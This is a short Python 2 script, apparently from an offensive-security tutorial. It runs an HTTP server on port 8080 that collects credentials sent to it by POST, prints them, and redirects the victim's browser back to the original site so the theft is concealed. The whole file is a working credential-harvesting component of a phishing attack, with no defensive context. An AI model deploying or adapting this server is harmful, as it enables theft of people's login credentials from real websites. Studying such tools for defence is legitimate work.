import SimpleHTTPServer
import SocketServer
import urllib


class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        # read the header to determine the size of the request
        content_length = int(self.headers['Content-Length'])
        # read in the contents of the request
        creds = self.rfile.read(content_length).decode('utf-8')
        print creds
        # parse out the originating site
        site = self.path[1:]
        self.send_response(301)
        # force the target browser to redirect back to the main page of the target site
        self.send_header('Location', urllib.unquote(site))
        self.end_headers()

server = SocketServer.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()
